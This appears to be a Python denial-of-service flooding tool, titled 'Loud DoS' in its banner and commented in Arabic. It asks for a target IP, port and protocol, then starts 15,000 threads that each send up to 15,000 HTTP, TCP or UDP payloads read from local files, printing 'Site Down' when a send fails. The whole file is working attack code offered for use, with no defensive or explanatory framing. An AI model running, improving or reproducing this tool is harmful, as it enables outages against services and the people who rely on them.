import socket
import requests
import threading
import time

def draw_banner():
    banner = """
    __                    __   ____            
   / /   ____  __  ______/ /  / __ \\____  _____
  / /   / __ \\/ / / / __  /  / / / / __ \\/ ___/
 / /___/ /_/ / /_/ / /_/ /  / /_/ / /_/ (__  ) 
/_____/\____/\\__, /\\__,_/  /_____/\\____/____/  
            /____/                             
    """
    print(banner)

def get_input(prompt, default):
    """يطلب إدخال المستخدم مع قيمة افتراضية."""
    user_input = input(prompt)
    return user_input if user_input else default

# رسم الشعار و الحصول على إدخالات المستخدم
draw_banner()
TARGET_IP = get_input("Enter target IP: ", "192.168.1.1")
PORT = int(get_input("Enter port (default is 80): ", "80"))
SEND_METHOD = get_input("Enter send method (HTTP, TCP, UDP, UPNP): ", "HTTP").upper()

# تحقق من أن البورت ضمن النطاق الصحيح
if PORT < 1 or PORT > 65535:
    print("Port number must be between 1 and 65535. Using default port 80.")
    PORT = 80

PACKETS_TO_SEND = 15000
HEADER_FILE = 'hyd.txt'
PACKETS_FILE = 'pcx.txt'

# قراءة الهيادرز من الملف
with open(HEADER_FILE, 'r') as f:
    headers = f.read()

# قراءة الباكيتس من الملف
with open(PACKETS_FILE, 'r') as f:
    packets = f.readlines()

def send_http(packet_data):
    url = f"http://{TARGET_IP}:{PORT}"
    data_to_send = f"{headers}\n{packet_data}"
    try:
        response = requests.post(url, data=data_to_send)
        print_colored_message(TARGET_IP)
    except requests.exceptions.RequestException:
        print_failure_message()

def send_tcp(packet_data):
    data_to_send = f"{headers}\n{packet_data}".encode()
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((TARGET_IP, PORT))
        sock.sendall(data_to_send)
        sock.close()
        print_colored_message(TARGET_IP)
    except Exception:
        print_failure_message()

def send_udp(packet_data):
    data_to_send = f"{headers}\n{packet_data}".encode()
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(data_to_send, (TARGET_IP, PORT))
        sock.close()
        print_colored_message(TARGET_IP)
    except Exception:
        print_failure_message()

def send_upnp(packet_data):
    # This is a placeholder for UPNP, as implementation can vary.
    # You would need a specific library or protocol details to send UPNP packets.
    print_colored_message(TARGET_IP)

def print_colored_message(ip):
    green = "\033[92m"
    yellow = "\033[93m"
    reset = "\033[0m"
    message = f"{green}<======Packets Sent to ({yellow}{ip}{green})=====>{reset}"
    print(message)

def print_failure_message():
    red = "\033[91m"
    reset = "\033[0m"
    message = f"{red}<======Site Down=====>{reset}"
    print(message)

def send_packets():
    packet_index = 0
    packets_sent = 0
    while packets_sent < PACKETS_TO_SEND:
        try:
            if packet_index >= len(packets):
                packet_index = 0  # إعادة تعيين المؤشر عند الوصول إلى نهاية الملف

            packet_data = packets[packet_index].strip()
            packet_index += 1

            if SEND_METHOD == "HTTP":
                send_http(packet_data)
            elif SEND_METHOD == "TCP":
                send_tcp(packet_data)
            elif SEND_METHOD == "UDP":
                send_udp(packet_data)
            elif SEND_METHOD == "UPNP":
                send_upnp(packet_data)
            else:
                print(f"Unknown send method: {SEND_METHOD}")
                break

            packets_sent += 1

        except Exception as e:
            print(f"Error: {e}")

        time.sleep(1 / PACKETS_TO_SEND)  # الانتظار قبل إرسال البكج التالي

def main():
    threads = []
    for _ in range(PACKETS_TO_SEND):
        thread = threading.Thread(target=send_packets)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == '__main__':
    main()